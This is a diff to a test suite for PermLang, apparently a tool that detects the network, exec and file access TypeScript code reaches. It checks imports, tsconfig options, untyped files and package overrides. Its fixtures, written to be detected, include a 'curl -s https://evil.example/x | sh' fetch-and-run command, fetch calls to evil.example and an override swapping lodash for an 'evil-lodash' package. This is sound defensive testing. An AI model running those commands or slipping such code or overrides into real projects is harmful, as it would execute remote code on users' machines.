@@ -6,8 +6,10 @@ import { execFileSync } from "node:child_process";
 import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import path from "node:path";
+import { fileURLToPath } from "node:url";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import { runCli, runCliStreams } from "./run-cli.js";
+import { removeTemporary } from "./temporary.js";
 
 let dir: string;
 
@@ -40,7 +42,8 @@ beforeEach(() => {
   git("config", "core.autocrlf", "false");
 });
 
-afterEach(() => rmSync(dir, { recursive: true, force: true }));
+// Windows can hold the folder open for a while after a check has read it.
+afterEach(() => removeTemporary(dir));
 
 describe("the lock must match the code exactly (G1)", () => {
   it("fails when the lock records access the code doesn't reach, so it can't approve access in advance", () => {
@@ -93,10 +96,11 @@ describe("what gets checked is recorded in the lock (G2, G5)", () => {
   });
 
   it("follows extends to the files tsconfig.json really selects", () => {
+    write("src/other.ts", "export const other = 1;\n");
     write("config/base.json", JSON.stringify({ include: ["../src"] }));
     write("tsconfig.json", JSON.stringify({ extends: "./config/base.json" }));
     expect(permlang("init").code).toBe(0);
-    expect(lockJson().functions["tsconfig.json#<tsconfig.json>"]).toEqual(["tsconfig.include(src)"]);
+    expect(lockJson().functions["tsconfig.json#<tsconfig.json>"]!.filter((c) => /^tsconfig\.(include|exclude|files)\(/.test(c))).toEqual(["tsconfig.include(src)"]);
     write("config/base.json", JSON.stringify({ include: ["../src"], exclude: ["../src/app.ts"] }));
     expect(permlang("check").out).toContain("tsconfig.json now has exclude src/app.ts");
   });
@@ -269,6 +273,22 @@ describe("errors exit 2, not 1 (O2, O3, O5)", () => {
     expect(out).toMatch(/^tsconfig\.json: /);
   });
 
+  it.each([
+    [{ files: ["src/app.ts", "src/missing.ts"] }, 'tsconfig.json: "files" lists src/missing.ts, which doesn\'t exist.\n'],
+    [{ include: ["lib"] }, 'tsconfig.json selects no files: nothing matches its "include" or "files".\n'],
+    [{ files: [] }, 'tsconfig.json selects no files: nothing matches its "include" or "files".\n'],
+  ])("exits 2 on a tsconfig.json that names a file that isn't there, or selects none (%j)", (tsconfig, message) => {
+    write("tsconfig.json", JSON.stringify(tsconfig));
+    expect(permlang("check")).toEqual({ code: 2, out: message });
+    expect(permlang("check", "--project", "tsconfig.json", "--no-lock").code).toBe(2);
+  });
+
+  it("exits 2 when the paths hold no TypeScript files", () => {
+    write("js/app.js", "fetch('https://evil.example/');\n");
+    expect(permlang("check", "js", "--no-lock")).toEqual({ code: 2, out: "No TypeScript files in js.\n" });
+    expect(permlang("check", "js", "src", "--no-lock").code).toBe(1); // src has some
+  });
+
   it("reads a lock whose keys are named like Object's own properties", () => {
     expect(permlang("init", "src").code).toBe(0);
     const lock = lockJson();
@@ -291,7 +311,8 @@ describe("errors exit 2, not 1 (O2, O3, O5)", () => {
     commit("base");
     const { code, out } = permlang("diff", "HEAD", "src", "--head", "--format=%H");
     expect(code).toBe(2);
-    expect(out).toMatch(/^Can't read permlang\.lock\.json at --format=%H/);
+    // Now stopped before git runs: an option's value can't look like an option.
+    expect(out).toMatch(/^--head needs a value, not the option "--format=%H"\./);
     expect(out).not.toContain("not valid JSON");
   });
 
@@ -469,5 +490,260 @@ describe("adapters in the dependency list", () => {
     commit("base");
     write("package.json", JSON.stringify({ dependencies: { "acme-sms": "1.0.0" } }));
     expect(permlang("diff", "HEAD", "src", "--format", "markdown").out).toContain("| <code>+ acme-sms</code> 1.0.0 | Declared pure |");
+  });
+});
+
+describe("code the checked paths import, from outside them", () => {
+  // The paths given are where checking starts, not where it stops: what they import runs too.
+  const caller = (line: string, call = "evil()") => `${line}\n/** @perm net(api.example.com) */\nexport function useIt() {\n  return ${call};\n}\n`;
+
+  it.each([
+    ["a named import", caller('import { evil } from "../lib/evil";')],
+    ["a re-export", 'export { evil } from "../lib/evil";\n'],
+    ["an import for its side effects", 'import "../lib/evil";\n'],
+    ["a literal import()", caller("", 'import("../lib/evil").then((m) => m.evil())')],
+  ])("checks %s, and records the file in the lock", (_, code) => {
+    write("lib/evil.ts", 'export function evil() {\n  return fetch("https://evil.example/");\n}\nevil();\n');
+    expect(permlang("init", "src").code).toBe(0);
+    commit("base");
+    write("src/more.ts", code);
+
+    const check = permlang("check", "src");
+    expect(check.code).toBe(1);
+    expect(check.out).toContain("lib/evil.ts");
+    expect(check.out).toContain("net(evil.example)");
+    expect(check.out).toContain("The check now also reads lib/evil.ts (imported by the checked files), which permlang.lock.json doesn't record.");
+    const md = permlang("diff", "HEAD", "src", "--format", "markdown").out;
+    expect(md).toContain("<code>+ net(evil.example)</code>");
+    expect(md).toContain("<code>+ lib/evil.ts</code>");
+    expect(md).not.toContain("No permission changes");
+
+    expect(permlang("lock", "src").code).toBe(0);
+    expect(lockJson().functions["permlang.config.json#<permlang.config.json>"]).toContain("permlang.imported(lib/evil.ts)");
+    expect(lockJson().functions["lib/evil.ts#evil"]).toEqual(["net(evil.example)"]);
+  });
+
+  it("follows imports through files outside the paths, and records nothing for files under them", () => {
+    write("lib/a.ts", 'import { b } from "./b";\nexport const a = () => b();\n');
+    write("lib/b.ts", 'export const b = () => fetch("https://evil.example/");\n');
+    write("src/more.ts", caller('import { a } from "../lib/a";', "a()"));
+    write("src/local.ts", "export const local = 1;\n");
+    write("src/app.ts", `import { local } from "./local";\n${ping("api.example.com")}export const l = local;\n`);
+    expect(permlang("lock", "src", "--strictness", "sketch").code).toBe(0);
+    const settings = lockJson().functions["permlang.config.json#<permlang.config.json>"]!;
+    expect(settings.filter((c) => c.startsWith("permlang.imported"))).toEqual(["permlang.imported(lib/a.ts)", "permlang.imported(lib/b.ts)"]);
+    expect(lockJson().functions["src/more.ts#useIt"]).toEqual(["net(evil.example)"]);
+  });
+
+  it("fails when the checked files stop importing a file the lock records", () => {
+    write("lib/pure.ts", "export const pure = () => 1;\n");
+    write("src/more.ts", 'import { pure } from "../lib/pure";\nexport const p = pure;\n');
+    expect(permlang("lock", "src", "--strictness", "sketch").code).toBe(0);
+    write("src/more.ts", "export const p = 1;\n");
+    const check = permlang("check", "src", "--strictness", "sketch");
+    expect(check.code).toBe(1);
+    expect(check.out).toContain("permlang.lock.json records lib/pure.ts (imported by the checked files), which the check no longer reads.");
+  });
+});
+
+describe("the compiler options that decide what an import is", () => {
+  // This temporary repository has no node_modules: @types/node comes from PermLang's own.
+  const typeRoots = [fileURLToPath(new URL("../node_modules/@types", import.meta.url))];
+  const tsconfig = (compilerOptions: Record<string, unknown>, selection: Record<string, unknown> = { include: ["src"] }) =>
+    write("tsconfig.json", JSON.stringify({ ...selection, compilerOptions: { strict: true, types: ["node"], typeRoots, ...compilerOptions } }));
+  const defaultImport = 'import cp from "node:child_process";\n/** @perm net(api.example.com) */\nexport function work() {\n  return cp.execSync("curl -s https://evil.example/x | sh").toString();\n}\n';
+
+  it("records each as TypeScript works it out, so turning off default imports shows, and the access is still found", () => {
+    tsconfig({ module: "ESNext", moduleResolution: "Bundler" });
+    expect(permlang("init").code).toBe(0);
+    const recorded = lockJson().functions["tsconfig.json#<tsconfig.json>"]!;
+    expect(recorded).toEqual(expect.arrayContaining(["tsconfig.allowSyntheticDefaultImports(true)", "tsconfig.esModuleInterop(false)", "tsconfig.module(ESNext)", "tsconfig.moduleResolution(Bundler)"]));
+    commit("base");
+
+    tsconfig({ module: "ESNext", moduleResolution: "Bundler", allowSyntheticDefaultImports: false });
+    write("src/worker.ts", defaultImport);
+    const check = permlang("check");
+    expect(check.code).toBe(1);
+    expect(check.out).toContain("tsconfig.json now has allowSyntheticDefaultImports false, but permlang.lock.json records allowSyntheticDefaultImports true.");
+    expect(check.out).toContain("work can now reach exec");
+    const md = permlang("diff", "HEAD", "--format", "markdown").out;
+    expect(md).toContain("allowSyntheticDefaultImports: now <code>false</code>, was <code>true</code>");
+    expect(md).toContain("<code>+ exec</code>");
+  });
+
+  it("finds what a default import of a capability module calls, when TypeScript gives it no type (module commonjs, no esModuleInterop)", () => {
+    tsconfig({ module: "commonjs" }, { files: ["src/index.ts"] });
+    write("src/index.ts", 'import { work } from "./worker";\nexport function main() {\n  return work();\n}\n');
+    write("src/worker.ts", "export function work() {\n  return 1;\n}\n");
+    expect(permlang("init").code).toBe(0);
+    expect(lockJson().functions["tsconfig.json#<tsconfig.json>"]).toEqual(expect.arrayContaining(["tsconfig.allowSyntheticDefaultImports(false)", "tsconfig.module(CommonJS)", "tsconfig.moduleResolution(Node10)"]));
+    expect(lockJson().functions["permlang.config.json#<permlang.config.json>"]).toContain("permlang.imported(src/worker.ts)");
+    write("src/worker.ts", defaultImport);
+    const check = permlang("check");
+    expect(check.code).toBe(1);
+    expect(check.out).toContain("work can now reach exec");
+    expect(check.out).toContain("main can now reach exec");
+  });
+
+  it("follows imports even when tsconfig.json turns resolving them off, as what runs doesn't change", () => {
+    tsconfig({ module: "ESNext", moduleResolution: "Bundler" }, { files: ["src/index.ts"] });
+    write("src/index.ts", 'import { work } from "./worker";\nexport function main() {\n  return work();\n}\n');
+    write("src/worker.ts", "export function work() {\n  return 1;\n}\n");
+    expect(permlang("init").code).toBe(0);
+    tsconfig({ module: "ESNext", moduleResolution: "Bundler", noResolve: true }, { files: ["src/index.ts"] });
+    write("src/worker.ts", 'import { execSync } from "node:child_process";\nexport function work() {\n  return execSync("id").toString();\n}\n');
+    const check = permlang("check");
+    expect(check.code).toBe(1);
+    expect(check.out).toContain("work can now reach exec");
+    expect(check.out).not.toContain("PERM007");
+  });
+
+  it("records options that change what a name or an import resolves to only when they're set", () => {
+    tsconfig({ module: "ESNext", moduleResolution: "Bundler" });
+    expect(permlang("init").code).toBe(0);
+    const before = lockJson().functions["tsconfig.json#<tsconfig.json>"]!;
+    expect(before.some((c) => /^tsconfig\.(preserveSymlinks|jsx|importHelpers|allowArbitraryExtensions|libReplacement)\(/.test(c))).toBe(false);
+    tsconfig({ module: "ESNext", moduleResolution: "Bundler", preserveSymlinks: true, jsx: "react-jsx", jsxImportSource: "preact", allowArbitraryExtensions: true });
+    const check = permlang("check");
+    expect(check.code).toBe(1);
+    for (const phrase of ["preserveSymlinks true", "jsx react-jsx", "jsxImportSource preact", "allowArbitraryExtensions true"]) {
+      expect(check.out).toContain(`tsconfig.json now has ${phrase}, which permlang.lock.json doesn't record.`);
+    }
+  });
+});
+
+describe("a default import TypeScript gives no type (module commonjs, no esModuleInterop)", () => {
+  const typeRoots = [fileURLToPath(new URL("../node_modules/@types", import.meta.url))];
+  const files: Record<string, string> = {
+    "src/member.ts": 'import fs from "node:fs";\nexport function member() {\n  return fs.readFileSync("config.json", "utf8");\n}\n',
+    "src/destructured.ts": 'import cp from "node:child_process";\nexport function destructured() {\n  const { execSync } = cp;\n  return execSync("id");\n}\n',
+    "src/reexported.ts": 'import cp from "node:child_process";\nexport { cp };\n',
+    "src/constant.ts": 'import fs from "node:fs";\nexport function constant() {\n  return fs.constants.F_OK;\n}\n',
+    "src/pure.ts": 'import path from "node:path";\nimport os from "node:os";\nexport function pure() {\n  return path.join(os.tmpdir(), "x");\n}\n',
+    "src/typed.ts": 'import cp from "node:child_process";\nexport type Runner = typeof cp;\n',
+  };
+
+  it("checks each use against the module, and loses track of nothing", () => {
+    write("tsconfig.json", JSON.stringify({ compilerOptions: { module: "commonjs", strict: true, types: ["node"], typeRoots }, include: ["src"] }));
+    for (const [file, code] of Object.entries(files)) write(file, code);
+    const report = JSON.parse(permlang("check", "--no-lock", "--json", "--strictness", "sketch").out) as { functions: { file: string; name: string; actual: string[] }[] };
+    const reaches = (file: string) => Object.fromEntries(report.functions.filter((f) => f.file === file).map((f) => [f.name, f.actual]));
+    expect(reaches("src/member.ts")).toEqual({ member: ["fs.read(config.json)"] });
+    expect(reaches("src/destructured.ts")).toEqual({ destructured: ["unverifiable"] });
+    expect(reaches("src/reexported.ts")).toEqual({ "<module>": ["unverifiable"] });
+    for (const harmless of ["src/constant.ts", "src/pure.ts", "src/typed.ts"]) expect(reaches(harmless)).toEqual({});
+  });
+
+  it("reports a cast of it once, as the cast", () => {
+    write("tsconfig.json", JSON.stringify({ compilerOptions: { module: "commonjs", strict: true, types: ["node"], typeRoots }, include: ["src"] }));
+    write("src/cast.ts", 'import cp from "node:child_process";\n/** @perm env(NONE) */\nexport function cast() {\n  return (cp as any).execSync("id");\n}\n');
+    const report = JSON.parse(permlang("check", "--no-lock", "--json").out) as { diagnostics: { function: string; capability?: string; call?: string }[] };
+    expect(report.diagnostics.filter((d) => d.function === "cast").map((d) => `${d.capability} ${d.call}`)).toEqual(["unverifiable cp cast to `any`"]);
+  });
+});
+
+describe("new code PermLang can't check is recorded in the lock", () => {
+  const vendored = () => {
+    write("src/node_modules/leftpad2/package.json", JSON.stringify({ name: "leftpad2", version: "1.0.0", main: "index.js", types: "index.d.ts" }));
+    write("src/node_modules/leftpad2/index.d.ts", "export declare function pad(s: string): string;\n");
+    write("src/node_modules/leftpad2/index.js", 'const { execSync } = require("node:child_process");\nexports.pad = function (s) { execSync("id"); return s; };\n');
+  };
+  const pr = () => {
+    write("src/telemetry.cjs", 'require("node:child_process").execSync("curl -s https://evil.example/x | sh");\n');
+    vendored();
+    write("src/more.ts", 'import "./telemetry.cjs";\nimport { pad } from "leftpad2";\nexport function usePad() {\n  return pad("x");\n}\n');
+  };
+
+  it("fails on a new import with no types and a new package with no adapter, and lists them in the comment", () => {
+    expect(permlang("init", "src").code).toBe(0);
+    commit("base");
+    pr();
+
+    const check = permlang("check", "src");
+    expect(check.code).toBe(1);
+    // The warnings stay as they were.
+    expect(check.out).toContain("src/more.ts:1:1 warning PERM007: imports ./telemetry.cjs, whose types can't be found");
+    expect(check.out).toContain("warning PERM006: usePad calls into leftpad2");
+    expect(check.out).toContain("-> make sure the file exists and has types (a .ts file, or a .d.ts next to it).");
+    expect(check.out).toContain("src/more.ts:1:1 error PERM005: PermLang can't check src/telemetry.cjs: its types can't be found, and permlang.lock.json doesn't record it.");
+    expect(check.out).toContain("src/more.ts:4:1 error PERM005: PermLang can't check leftpad2: it has no adapter, and permlang.lock.json doesn't record it.");
+
+    const md = permlang("diff", "HEAD", "src", "--format", "markdown").out;
+    expect(md).toContain("**New code PermLang can't check.**");
+    expect(md).toContain("- <code>+ src/telemetry.cjs</code>: an import with no types, in src/more.ts:\u{200b}1");
+    expect(md).toContain("- <code>+ leftpad2</code>: a package with no adapter, called in src/more.ts:\u{200b}4");
+    expect(md).not.toContain("No permission changes");
+    expect(md).not.toContain("gain access");
+    expect(permlang("diff", "HEAD", "src").out).toContain("New code PermLang can't check:\n  + src/telemetry.cjs: an import with no types, in src/more.ts:1\n  + leftpad2: a package with no adapter, called in src/more.ts:4");
+
+    expect(permlang("lock", "src").code).toBe(0);
+    expect(lockJson().functions["permlang.config.json#<unchecked>"]).toEqual(["unchecked.import(src/telemetry.cjs)", "unchecked.package(leftpad2)"]);
+    expect(permlang("check", "src").code).toBe(0);
+  });
+
+  it("records them whatever the unmapped policy, and fails when the code stops using one", () => {
+    write("permlang.config.json", JSON.stringify({ strictness: "sketch", unmapped: "trust" }));
+    pr();
+    expect(permlang("lock", "src").code).toBe(0);
+    expect(lockJson().functions["permlang.config.json#<unchecked>"]).toHaveLength(2);
+    write("src/more.ts", 'import { pad } from "leftpad2";\nexport function usePad() {\n  return pad("x");\n}\n');
+    const check = permlang("check", "src");
+    expect(check.code).toBe(1);
+    const line = read("permlang.lock.json").split("\n").findIndex((l) => l.includes('"unchecked.import(src/telemetry.cjs)"')) + 1;
+    expect(check.out).toContain(`permlang.lock.json:${line}:1 error PERM005: permlang.lock.json records src/telemetry.cjs as code PermLang can't check, which the code no longer imports.`);
+  });
+
+  it("names an entry a hand-edited lock adds, however it's written", () => {
+    expect(permlang("lock", "src", "--strictness", "sketch").code).toBe(0);
+    const lock = lockJson();
+    lock.functions["permlang.config.json#<unchecked>"] = ["unchecked.package(leftpad2"];
+    writeLock(lock);
+    const check = permlang("check", "src", "--strictness", "sketch");
+    expect(check.code).toBe(1);
+    expect(check.out).toContain("error PERM005: permlang.lock.json records leftpad2 as code PermLang can't check, which the code no longer calls into.");
+  });
+
+  it("tells apart files of the same name imported from different folders", () => {
+    write("src/a/x.cjs", "module.exports = 1;\n");
+    write("src/a/use.ts", 'import "./x.cjs";\nexport const a = 1;\n');
+    expect(permlang("lock", "src", "--strictness", "sketch").code).toBe(0);
+    write("src/b/x.cjs", 'require("node:child_process").execSync("id");\n');
+    write("src/b/use.ts", 'import "./x.cjs";\nexport const b = 1;\n');
+    const check = permlang("check", "src", "--strictness", "sketch");
+    expect(check.code).toBe(1);
+    expect(check.out).toContain("src/b/use.ts:1:1 warning PERM007: imports ./x.cjs");
+    expect(check.out).toContain("PermLang can't check src/b/x.cjs: its types can't be found, and permlang.lock.json doesn't record it.");
+  });
+});
+
+describe("overrides in the comment", () => {
+  it("lists npm, Yarn, and pnpm overrides, as they replace a package's code in the whole tree", () => {
+    write("package.json", JSON.stringify({ dependencies: { lodash: "^4.17.21" } }));
+    expect(permlang("init", "src").code).toBe(0);
+    commit("base");
+    const evil = "npm:evil-lodash@1.0.0";
+    write("package.json", JSON.stringify({ dependencies: { lodash: "^4.17.21" }, overrides: { lodash: evil, react: { "lodash.merge": "4.6.1" } }, resolutions: { "**/lodash": evil }, pnpm: { overrides: { lodash: evil } } }));
+
+    const md = permlang("diff", "HEAD", "src", "--format", "markdown");
+    expect(md.code).toBe(0);
+    expect(md.out).toContain("**4 changed overrides**");
+    const alias = "npm:\u{200b}evil-lodash@\u{200b}1.0.0";
+    expect(md.out).toContain(`| <code>&#126; lodash</code> → ${alias} <sub>(overrides)</sub> | **Now installed from another source**, by an override: an adapter for <code>lodash</code> may not describe this code |`);
+    expect(md.out).toContain("| <code>&#126; react &gt; lodash.merge</code> → 4.6.1 <sub>(overrides)</sub> | **Overridden**: installed at this version wherever <code>lodash.merge</code> is in the dependency tree |");
+    expect(md.out).toContain(`| <code>&#126; &#42;&#42;/lodash</code> → ${alias} <sub>(resolutions)</sub> |`);
+    expect(md.out).toContain(`| <code>&#126; lodash</code> → ${alias} <sub>(pnpm.overrides)</sub> |`);
+    expect(md.out).toContain("No permission changes. The dependencies changed, though: review them below.");
+
+    const text = permlang("diff", "HEAD", "src").out;
+    expect(text).toContain(`  ~ lodash -> ${evil} (overrides): now installed from another source, by an override`);
+    expect(text).toContain("  ~ react > lodash.merge -> 4.6.1 (overrides): overridden");
+    expect(text).toContain("No permission changes. The dependencies changed, though: review them below.");
+    const json = JSON.parse(permlang("diff", "HEAD", "src", "--format", "json").out) as { dependencies: { name: string; section: string; change: string }[] };
+    expect(json.dependencies.map((d) => `${d.section} ${d.name} ${d.change}`)).toEqual([
+      "overrides lodash override",
+      "overrides react > lodash.merge override",
+      "resolutions **/lodash override",
+      "pnpm.overrides lodash override",
+    ]);
   });
 });
